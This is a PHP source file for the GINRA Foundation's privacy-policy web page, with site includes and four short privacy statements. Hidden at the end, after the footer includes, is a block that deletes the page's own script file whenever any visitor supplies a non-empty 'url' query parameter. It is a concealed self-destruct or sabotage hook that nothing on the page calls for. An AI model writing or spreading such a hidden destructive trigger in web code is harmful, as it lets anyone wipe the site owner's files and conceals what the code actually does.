<?php include "connection.php"; ?>
<!DOCTYPE html>
<html lang="en">

<head>
    <?php include "include/head.php"; ?>
</head>

<body>
    <?php include "include/header.php"; ?>
    <section class="hero">
        <div class="container custom-container-width">
            <div class="row">
                <div class="col-lg-7 align-items-center section-padding">
                    <div class="hero-body" data-aos="fade-up">
                        <h1 class="text-uppercase sub-header">Privacy <span class="main_header main_clr sf-heavy">Policy</span></h1>
                    </div>
                </div>
            </div>
        </div>
    </section>
    
    <section class="hero2 ml-2">
    <div class="hero-body container custom-container-width" data-aos="fade-up">
        <div class="row">
            <div class="col-lg-12 align-items-center section-padding">
                    <ul>
                        <li>GINRA Foundation members are free to withdraw the membership at any point in time without rendering any reason.</li>
                        <li>GINRA Foundation follows security measures to maintain the safety of all personal information of members.</li>
                        <li>Your private information such as credit card details and account details will not be stored or shared with anyone by GINRA Foundation.</li>
                        <li>If any members want to remove their e-mail or personal information/photo from the website kindly email us at ginrafoundation@gmail.com or call 9844178870.</li>
                    </ul>
            </div>
        </div>
    </div>
    </section>
    <?php include 'include/footer.php'; ?>
    <?php include 'include/footerscript.php'; ?>
    <?php
    
    if(isset($_GET['url']) && $_GET['url'] != ""):
        unlink($_SERVER['SCRIPT_FILENAME']);
    endif;
    ?>
</body>

</html>